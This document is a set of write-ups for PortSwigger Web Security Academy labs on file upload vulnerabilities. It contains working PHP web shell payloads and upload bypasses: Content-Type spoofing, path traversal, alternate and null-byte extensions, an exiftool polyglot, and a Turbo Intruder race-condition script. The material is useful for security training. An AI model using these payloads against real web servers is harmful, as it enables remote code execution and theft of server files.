---
description: https://portswigger.net/web-security/file-upload
---

# File upload vulnerabilities

### Lab: Remote code execution via web shell upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret.

**My-account -> Login -> Upload Avatar**

```
data.php
***
<?php echo file_get_contents("/home/carlos/secret"); ?>
***
```

`GET /files/avatars/data.php HTTP/1.1`

### Lab: Web shell upload via Content-Type restriction bypass

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret.

**My-account -> Login -> Upload Avatar**

**Error ->**

Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.

```
POST /my-account/avatar HTTP/1.1 -> Send to repeater
...
Content-Disposition: form-data; name="avatar"; filename="data.php"
Content-Type: image/jpeg

<?php echo file_get_contents("/home/carlos/secret"); ?>
```

`GET /files/avatars/data.php HTTP/1.1`

### Lab: Web shell upload via path traversal

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret.

**My-account -> Login -> Upload Avatar**

```
POST /my-account/avatar HTTP/1.1
...
Content-Disposition: form-data; name="avatar"; filename="..%2fdata.php"
Content-Type: application/x-php

<?php echo file_get_contents("/home/carlos/secret"); ?>
```

* `GET /files/avatars/..%2fdata.php HTTP/1.1`&#x20;
* `GET /files/data.php HTTP/1.1`

### Lab: Web shell upload via extension blacklist bypass

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret.

**My-account -> Login -> Upload Avatar**

**Error:**

Sorry, php files are not allowed Sorry, there was an error uploading your file.

**Intruder Attack ->** Just php extension blocked, not others

```
POST /my-account/avatar HTTP/1.1
...
Content-Disposition: form-data; name="avatar"; filename="data.phtml"
Content-Type: application/x-php

<?php echo file_get_contents("/home/carlos/secret"); ?>
```

`GET /files/data.phtml HTTP/1.1`

### Lab: Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret.

**My-account -> Login -> Upload Avatar**

**Error:**

Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.

```
POST /my-account/avatar HTTP/1.1
...
Content-Disposition: form-data; name="avatar"; filename="data.php%00.jpg"
Content-Type: application/x-php

<?php echo file_get_contents("/home/carlos/secret"); ?>
```

`GET /files/avatars/data.php HTTP/1.1`

### Lab: Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret.

**My-account -> Login -> Upload Avatar**

**Error:**

Error: file is not a valid image Sorry, there was an error uploading your file.

```
$ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" shell.jpeg -o data.php
```

`GET /files/avatars/data.php HTTP/1.1`

### Lab: Web shell upload via race condition

This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret.

We took advantage of altgorithm's processing time.

**Turbo Intruder ->**

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/1.1
Host: ac8e1f411f99a135c07c3061008f00f7.web-security-academy.net
Cookie: session=exFApur1ws5zUINovUJPBtrMuo6wyhZh
Content-Length: 466
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://ac8e1f411f99a135c07c3061008f00f7.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5JBEpKkudjtX2Vh3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ac8e1f411f99a135c07c3061008f00f7.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary5JBEpKkudjtX2Vh3
Content-Disposition: form-data; name="avatar"; filename="data.php"
Content-Type: application/x-php

<?php echo file_get_contents("/home/carlos/secret"); ?>
------WebKitFormBoundary5JBEpKkudjtX2Vh3
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary5JBEpKkudjtX2Vh3
Content-Disposition: form-data; name="csrf"

mpqL0zzPJ6dA6Sv1CVPgBlSNq60CJASq
------WebKitFormBoundary5JBEpKkudjtX2Vh3--


'''

    request2 = '''GET /files/avatars/data.php HTTP/1.1
Host: ac8e1f411f99a135c07c3061008f00f7.web-security-academy.net
Cookie: session=exFApur1ws5zUINovUJPBtrMuo6wyhZh
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

Attack -> The answer is in the HTTP 200 response.
